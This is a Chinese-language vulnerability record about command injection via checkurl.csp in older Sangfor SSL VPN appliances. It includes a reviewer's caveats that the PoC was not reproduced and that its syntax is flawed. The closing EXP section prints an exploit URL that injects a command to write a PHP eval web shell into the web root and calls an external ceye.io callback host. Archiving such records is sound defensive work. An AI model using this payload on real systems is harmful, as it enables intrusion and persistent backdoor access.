---
source: "历史归档批(无原始出处标注)"
id: "vw-71717c7d17caac09cb3b7e89"
entity_id: "ve-71717c7d17caac09cb3b7e89"
schema_version: "1"
title: "深信服 SSL VPN 低版本Getshell.md"
product: "Sangfor SSL VPN低版本未定义"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未给版本/鉴权；写入.sin需PHP处理器映射"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E4%BD%8E%E7%89%88%E6%9C%ACGetshell.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

# 深信服 SSL VPN 低版本Getshell.md

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor SSL VPN低版本未定义
- 本文讨论：checkurl.csp url命令注入候选
- 版本、权限与配置前提：未给版本/鉴权；写入.sin需PHP处理器映射
- 资料类型：无来源单URL利用片段；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- URL含未编码空格/引号及固定第三方回连域名，缺完整HTTP上下文
- PHP起始标签紧跟分号、.sin执行配置未说明；无结果/来源/修复

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 语法、文件执行配置、认证及固件范围待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->




## EXP

```
https://x.x.x.x/por/checkurl.csp?url=http://123.j8qw5x.ceye.io/%20;echo "<?php;eval(\$_POST['a']);" > /usr/local/apache2/htdocs/com/svpnrcico/360.sin;&timeout=2&retry=3
```

